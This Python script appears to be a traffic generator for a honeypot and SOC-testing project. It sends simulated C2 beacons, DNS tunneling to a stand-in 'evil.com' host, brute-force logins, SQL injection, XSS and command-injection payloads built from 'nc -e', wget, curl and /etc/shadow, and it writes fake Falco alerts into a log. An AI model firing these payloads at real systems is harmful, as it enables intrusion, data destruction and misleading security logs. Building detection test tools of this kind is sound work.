#!/usr/bin/env python3
"""
C2Trap Chaos Traffic Generator
Generates unpredictable, high-entropy traffic with 12+ attack vectors 
and advanced randomization for realistic SOC testing.

Attack Coverage:
1. Web C2 Beaconing (T1071.001)
2. DNS Tunneling (T1071.004)
3. Data Exfiltration (T1048)
4. DGA Domains (T1568.002)
5. Credential Access (T1078)
6. Discovery Scanning (T1082)
7. Command Injection (T1059)
8. Lateral Movement (T1021) - Simulated
9. Defense Evasion (T1027)
10. SQL Injection (T1190)
11. XSS/Web Attacks (T1190)
12. Port Scanning (T1046) - Simulated 
"""

import os
import sys
import time
import random
import string
import argparse
import socket
import json
import hashlib
import base64
import threading
from datetime import datetime, timezone
from typing import List, Dict, Any, Optional

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# =============================================
# Configuration & Constants
# =============================================

class ChaosConfig:
    HTTP_PORT = 8888
    DNS_PORT = 53
    FTP_PORT = 21
    TARGET = "localhost"
    
    # Extensive User-Agent Pool
    USER_AGENTS = [
        # Modern Browsers
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
        # Mobile
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36",
        # Bots/Crawlers
        "Googlebot/2.1 (+http://www.google.com/bot.html)",
        "Bingbot/2.0; +http://www.bing.com/bingbot.htm",
        # Developer Tools (Suspicious in user traffic)
        "curl/8.4.0",
        "Wget/1.21.4",
        "PostmanRuntime/7.36.0",
        "python-requests/2.31.0",
        "Go-http-client/1.1",
        # Attack Tools
        "sqlmap/1.8.2#stable",
        "Nikto/2.1.6",
        "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
        "Hydra/9.5",
    ]

    # MITRE ATT&CK Mapping
    MITRE = {
        "beacon": {"id": "T1071.001", "name": "Web Protocols"},
        "dns_tunnel": {"id": "T1071.004", "name": "DNS Protocols"},
        "exfil": {"id": "T1048", "name": "Exfiltration Over IP"},
        "dga": {"id": "T1568.002", "name": "DGA"},
        "cred_stuffing": {"id": "T1078", "name": "Valid Accounts"},
        "discovery": {"id": "T1082", "name": "System Discovery"},
        "cmd_injection": {"id": "T1059", "name": "Command Scripting"},
        "lateral": {"id": "T1021", "name": "Remote Services"},
        "evasion": {"id": "T1027", "name": "Obfuscated Files"},
        "sqli": {"id": "T1190", "name": "Exploit Public-Facing App"},
        "xss": {"id": "T1190", "name": "Exploit Public-Facing App"},
        "scanning": {"id": "T1046", "name": "Network Service Scanning"},
    }

    # Suspicious Keywords for Payload Generation
    SUSPICIOUS_KEYWORDS = [
        "cmd.exe", "/bin/sh", "wget", "curl", "powershell", "nc -e",
        "union select", "alert(1)", "<script>", "eval()", "base64_decode",
        "/etc/passwd", "/etc/shadow", "c:\\windows\\system32",
        "whoami", "ipconfig", "net user", "cat /proc/cpuinfo"
    ]


# =============================================
# Logger
# =============================================

class ChaosLogger:
    """Advanced colored logging"""
    COLORS = {
        "INFO": "\033[94m",      # Blue
        "ATTACK": "\033[91m",    # Red
        "STEALTH": "\033[95m",   # Magenta
        "CLEAN": "\033[92m",     # Green
        "WARN": "\033[93m",      # Yellow
        "RESET": "\033[0m"
    }

    @staticmethod
    def log(msg: str, level: str = "INFO", details: str = ""):
        ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        color = ChaosLogger.COLORS.get(level, ChaosLogger.COLORS["INFO"])
        reset = ChaosLogger.COLORS["RESET"]
        
        # Calculate width for alignment
        prefix = f"{ts} [{level:^7}]"
        print(f"{color}{prefix}{reset} {msg} {details}")


# =============================================
# Traffic Generation Modules
# =============================================

class ChaosTrafficker:
    def __init__(self, target, http_port, dns_port, ftp_port):
        self.target = target
        self.http_port = http_port
        self.dns_port = dns_port
        self.ftp_port = ftp_port
        self.session = requests.Session()
        
    def _random_headers(self) -> Dict[str, str]:
        """Generate random, realistic headers"""
        headers = {
            "User-Agent": random.choice(ChaosConfig.USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": random.choice(["en-US,en;q=0.5", "en-GB,en;q=0.5", "es-ES,es;q=0.9"]),
            "Connection": random.choice(["keep-alive", "close"]),
        }
        
        # Add random extra headers for fingerprint variety
        if random.random() < 0.3:
            headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        if random.random() < 0.2:
            headers["Cache-Control"] = "no-cache"
            
        return headers

    def _random_string(self, length: int) -> str:
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    # --- Attack Vector 1: Web C2 Beaconing (T1071.001) ---
    def attack_c2_beacon(self) -> Dict:
        endpoints = ["/api/v1/status", "/comm/check", "/gate/login", "/resource/update", "/news/feed"]
        endpoint = random.choice(endpoints)
        
        # Polymorphic payload
        payload_type = random.choice(["json", "form", "base64"])
        headers = self._random_headers()
        
        if payload_type == "json":
            data = {"id": self._random_string(16), "status": "idle", "tick": int(time.time())}
        elif payload_type == "form":
            data = {"session": self._random_string(24), "v": "2.1"}
        else:
            # Fake base64 encoded command
            raw = f"id={self._random_string(8)}&cmd=sleep".encode()
            data = base64.b64encode(raw).decode()
        
        try:
            if payload_type == "base64":
                requests.post(f"http://{self.target}:{self.http_port}{endpoint}", data=data, headers=headers, timeout=2)
            else:
                requests.post(f"http://{self.target}:{self.http_port}{endpoint}", json=data, headers=headers, timeout=2)
            return {"type": "c2_beacon", "mitre": ChaosConfig.MITRE["beacon"], "desc": f"Beacon to {endpoint}"}
        except Exception as e:
            return {"type": "error", "desc": f"C2 Beacon failed: {e}"}

    # --- Attack Vector 2: DNS Tunneling (T1071.004) ---
    def attack_dns_tunnel(self) -> Dict:
        # Hex encoded chunks of fake data
        chunk = self._random_string(random.randint(10, 30)).encode().hex()
        domain = f"{chunk}.tunnel.c2.evil.com"
        
        try:
            # Simulate DNS query via UDP
            query = self._build_dns_query(domain)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)
            sock.sendto(query, (self.target, self.dns_port))
            sock.close()
            return {"type": "dns_tunnel", "mitre": ChaosConfig.MITRE["dns_tunnel"], "desc": f"Query: {domain[:20]}..."}
        except Exception as e:
            return {"type": "error", "desc": f"DNS Tunnel failed: {e}"}

    # --- Attack Vector 3: Data Exfiltration (T1048) ---
    def attack_exfiltration(self) -> Dict:
        # High entropy payload simulation
        size = random.randint(100, 2000)
        data = os.urandom(size)
        encoded_data = base64.b64encode(data).decode()
        
        headers = self._random_headers()
        headers["X-Data-ID"] = self._random_string(10)
        
        try:
            requests.post(f"http://{self.target}:{self.http_port}/submit", data=encoded_data, headers=headers, timeout=3)
            return {"type": "exfil", "mitre": ChaosConfig.MITRE["exfil"], "desc": f"Exfiltrated {size} bytes"}
        except Exception as e:
            return {"type": "error", "desc": f"Exfil failed: {e}"}

    # --- Attack Vector 4: DGA Domains (T1568.002) ---
    def attack_dga(self) -> Dict:
        tlds = [".xyz", ".top", ".club", ".info", ".pro", ".click"]
        # Generate random pronounceable-ish string (consonant-vowel mix)
        dga = ""
        for _ in range(random.randint(3, 6)):
            dga += random.choice("bcdfghjklmnpqrstvwxyz") + random.choice("aeiou")
        
        domain = dga + self._random_string(4) + random.choice(tlds)
        
        try:
            query = self._build_dns_query(domain)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(query, (self.target, self.dns_port))
            sock.close()
            return {"type": "dga", "mitre": ChaosConfig.MITRE["dga"], "desc": f"DGA: {domain}"}
        except Exception as e:
            return {"type": "error", "desc": f"DGA failed: {e}"}

    # --- Attack Vector 5: Credential Access (T1078) ---
    def attack_credential_stuffing(self) -> Dict:
        # Simulate quick brute force attempt (3-5 tries)
        users = ["admin", "root", "support", "user", "guest"]
        passwords = ["123456", "password", "admin123", "root", "toor"]
        
        target_user = random.choice(users)
        attempts = []
        
        for _ in range(random.randint(2, 4)):
            pwd = random.choice(passwords)
            attempts.append(f"{target_user}:{pwd}")
            # Simulate generic web login
            try:
                requests.post(f"http://{self.target}:{self.http_port}/login", 
                              json={"username": target_user, "password": pwd}, 
                              headers=self._random_headers(), timeout=1)
            except: pass
            
        return {"type": "cred_stuffing", "mitre": ChaosConfig.MITRE["cred_stuffing"], "desc": f"Brute force on {target_user} ({len(attempts)} attempts)"}

    # --- Attack Vector 6: Discovery (T1082) ---
    def attack_discovery(self) -> Dict:
        targets = [
            "/api/users", "/proc/net/tcp", "/etc/hosts", 
            "/config.json", "/.env", "/backup.sql"
        ]
        target_file = random.choice(targets)
        
        try:
            requests.get(f"http://{self.target}:{self.http_port}{target_file}", headers=self._random_headers(), timeout=1)
            return {"type": "discovery", "mitre": ChaosConfig.MITRE["discovery"], "desc": f"Scanning for {target_file}"}
        except Exception as e:
            return {"type": "error", "desc": f"Discovery failed: {e}"}

    # --- Attack Vector 7: Command Injection (T1059) ---
    def attack_cmd_injection(self) -> Dict:
        cmd = random.choice(ChaosConfig.SUSPICIOUS_KEYWORDS[:6]) # take first few which are commands
        # Various injection styles
        injections = [
            f"; {cmd}", f"| {cmd}", f"&& {cmd}", f"`{cmd}`", f"$({cmd})"
        ]
        payload = random.choice(injections)
        
        try:
            # Inject into a query parameter
            requests.get(f"http://{self.target}:{self.http_port}/search?q={payload}", headers=self._random_headers(), timeout=1)
            return {"type": "cmd_injection", "mitre": ChaosConfig.MITRE["cmd_injection"], "desc": f"Injected: {payload}"}
        except Exception as e:
            return {"type": "error", "desc": f"Cmd Injection failed: {e}"}

    # --- Attack Vector 8: Defense Evasion (T1027) ---
    def attack_evasion_obfuscation(self) -> Dict:
        # Obfuscated payload in header or cookie
        hidden_payload = base64.b64encode(b"eval(base64_decode('...'))").decode()
        headers = self._random_headers()
        headers["Cookie"] = f"session={self._random_string(10)}; tracking_id={hidden_payload}"
        
        try:
            requests.get(f"http://{self.target}:{self.http_port}/", headers=headers, timeout=1)
            return {"type": "evasion", "mitre": ChaosConfig.MITRE["evasion"], "desc": "Obfuscated payload in Cookie"}
        except Exception as e:
            return {"type": "error", "desc": f"Evasion failed: {e}"}

    # --- Attack Vector 9: SQL Injection (T1190) ---
    def attack_sqli(self) -> Dict:
        payloads = [
            "' OR '1'='1", "1; DROP TABLE users", "' UNION SELECT 1,2,3--", 
            "admin' --", "1' OR '1' = '1"
        ]
        payload = random.choice(payloads)
        
        try:
            requests.get(f"http://{self.target}:{self.http_port}/items?id={payload}", headers=self._random_headers(), timeout=1)
            return {"type": "sqli", "mitre": ChaosConfig.MITRE["sqli"], "desc": f"SQLi: {payload}"}
        except Exception as e:
            return {"type": "error", "desc": f"SQLi failed: {e}"}

    # --- Attack Vector 10: XSS (T1190) ---
    def attack_xss(self) -> Dict:
        payloads = [
            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", 
            "javascript:alert(1)", "\"><script>alert(document.cookie)</script>"
        ]
        payload = random.choice(payloads)
        
        try:
            requests.post(f"http://{self.target}:{self.http_port}/comment", 
                          data={"comment": payload}, headers=self._random_headers(), timeout=1)
            return {"type": "xss", "mitre": ChaosConfig.MITRE["xss"], "desc": f"XSS: {payload}"}
        except Exception as e:
            return {"type": "error", "desc": f"XSS failed: {e}"}

    # --- Attack Vector 11: Port Scanning (T1046) ---
    def attack_port_scan(self) -> Dict:
        # Simulate a quick scan of random ports on target
        # Note: We won't actually scan random ports to avoid freezing,
        # but we'll connect to our known ports rapidly to simulate the noise
        target_ports = [self.http_port, self.dns_port, self.ftp_port, 80, 443, 8080, 22]
        random.shuffle(target_ports)
        
        scanned = []
        for port in target_ports[:3]: # Scan 3 random ports
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                sock.connect_ex((self.target, port))
                sock.close()
                scanned.append(port)
            except: pass
            
        return {"type": "scanning", "mitre": ChaosConfig.MITRE["scanning"], "desc": f"Scanned ports: {scanned}"}

    # --- Attack Vector 12: Lateral Movement (T1021) ---
    def attack_lateral_movement(self) -> Dict:
        # Simulate attempting to connect to SMB/RDP ports (simulated via HTTP call describing the action)
        # Since we can't actually RDP, we'll send a specific 'lateral' signal to the decoy
        # or just try to connect to a high port
        
        try:
             # Just a simple connection attempt to 445 (SMB) - likely to timeout
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.2)
            sock.connect_ex((self.target, 445)) 
            sock.close()
            return {"type": "lateral", "mitre": ChaosConfig.MITRE["lateral"], "desc": "SMB Connection Attempt (Port 445)"}
        except:
             return {"type": "lateral", "mitre": ChaosConfig.MITRE["lateral"], "desc": "Lateral Movement Simulation Failed"}


    # --- Utility Methods ---
    def _build_dns_query(self, domain: str) -> bytes:
        query = bytes([random.randint(0, 255), random.randint(0, 255)])
        query += b'\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
        for part in domain.split('.'):
            query += bytes([len(part)]) + part.encode()
        query += b'\x00\x00\x01\x00\x01'
        return query

    def inject_falco_alert(self) -> Dict:
        """Inject a fake Falco alert for demo purposes"""
        falco_log = "logs/falco/events.json"
        if not os.path.exists(falco_log):
            return {"type": "info", "desc": "Falco log not found, skipping injection"}
            
        alerts = [
            {
                "rule": "Terminal shell in container",
                "priority": "Warning",
                "output": "Shell spawned in a container (user=root container_id=c2trap-http)",
                "source": "syscall",
                "tags": ["container", "shell", "mitre_execution"]
            },
            {
                "rule": "Read sensitive file untrusted",
                "priority": "Critical",
                "output": "Sensitive file opened for reading by untrusted program (file=/etc/shadow)",
                "source": "syscall",
                "tags": ["container", "filesystem", "mitre_credential_access"]
            },
            {
                "rule": "Outbound Connection to C2",
                "priority": "Notice",
                "output": "Outbound connection to known C2 IP (command=curl 185.100.x.x)",
                "source": "syscall",
                "tags": ["network", "mitre_c2"]
            }
        ]
        
        alert = random.choice(alerts)
        timestamp = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.%fZ")
        
        log_entry = {
            "time": timestamp,
            "rule": alert["rule"],
            "priority": alert["priority"],
            "output": f"{timestamp}: {alert['priority']} {alert['output']}",
            "hostname": self.target if self.target != "localhost" else "c2trap-demo",
            "source": alert["source"],
            "tags": alert["tags"]
        }
        
        try:
            with open(falco_log, "a") as f:
                f.write(json.dumps(log_entry) + "\n")
            return {"type": "falco", "mitre": {"id": "T1611", "name": "Container Escape"}, "desc": f"Falco Alert: {alert['rule']}"}
        except Exception as e:
            return {"type": "error", "desc": f"Falco injection failed: {e}"}



# =============================================
# Chaos Engine
# =============================================

class ChaosEngine:
    def __init__(self, target="localhost", intensity="high"):
        self.trafficker = ChaosTrafficker(target, ChaosConfig.HTTP_PORT, ChaosConfig.DNS_PORT, ChaosConfig.FTP_PORT)
        self.intensity = intensity
        self.running = True
        
        # Weighted attack choices
        self.attack_vectors = [
            (self.trafficker.attack_c2_beacon, 15),
            (self.trafficker.attack_dns_tunnel, 10),
            (self.trafficker.attack_exfiltration, 5),
            (self.trafficker.attack_dga, 10),
            (self.trafficker.attack_credential_stuffing, 8),
            (self.trafficker.attack_discovery, 8),
            (self.trafficker.attack_cmd_injection, 8),
            (self.trafficker.attack_evasion_obfuscation, 8),
            (self.trafficker.attack_sqli, 8),
            (self.trafficker.attack_xss, 8),
            (self.trafficker.attack_port_scan, 5),
            (self.trafficker.attack_lateral_movement, 2),
            (self.trafficker.inject_falco_alert, 5),
            # Clean traffic baseline (optional mix)
            (self._generate_clean_traffic, 15) 
        ]
        
    def _generate_clean_traffic(self) -> Dict:
        """Baseline noise"""
        try:
            requests.get(f"http://{self.trafficker.target}:{ChaosConfig.HTTP_PORT}/", timeout=1)
            return {"type": "clean", "desc": "Legitimate HTTP Traffic"}
        except:
            return {"type": "clean", "desc": "Clean traffic failed"}

    def run_chaos(self, duration_sec: int):
        ChaosLogger.log("Starting Chaos Engine", "INFO", f"Target: {self.trafficker.target} | Intensity: {self.intensity}")
        ChaosLogger.log("="*60)
        
        start_time = time.time()
        event_count = 0
        
        while time.time() - start_time < duration_sec:
            # 1. Select Attack Vector based on weights
            func = random.choices(
                [x[0] for x in self.attack_vectors],
                weights=[x[1] for x in self.attack_vectors]
            )[0]
            
            # 2. Execute Attack
            result = func()
            event_count += 1
            
            # 3. Log Result
            if result.get("type") == "clean":
                ChaosLogger.log(result.get("desc"), "CLEAN")
            elif result.get("type") == "error":
                ChaosLogger.log(result.get("desc"), "WARN")
            else:
                mitre = result.get("mitre", {})
                ChaosLogger.log(f"{result.get('desc')}", "ATTACK", 
                              f"[{mitre.get('id')} {mitre.get('name')}]")
            
            # 4. Chaos Jitter (Random sleep)
            if self.intensity == "insane":
                sleep_time = random.uniform(0.01, 0.1) # Machine gun mode
            elif self.intensity == "high":
                sleep_time = random.uniform(0.1, 0.8)  # Active attack
            else: # Low/Stealth
                sleep_time = random.uniform(1.0, 5.0)  # Low and slow
                
            time.sleep(sleep_time)
            
        ChaosLogger.log("="*60)
        ChaosLogger.log("Chaos Scenario Complete", "INFO", f"Total Events: {event_count}")


try:
    from scripts.common_banner import print_banner
except ImportError:
    # Fallback if running from scripts/ directly
    from common_banner import print_banner

def main():
    print_banner()
    parser = argparse.ArgumentParser(description="C2Trap Chaos Traffic Generator")
    parser.add_argument("-t", "--target", default="localhost", help="Target host")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Duration in seconds")
    parser.add_argument("-i", "--intensity", choices=["low", "high", "insane"], default="high", help="Traffic intensity")
    
    args = parser.parse_args()
    
    engine = ChaosEngine(target=args.target, intensity=args.intensity)
    engine.run_chaos(args.duration)

if __name__ == "__main__":
    main()
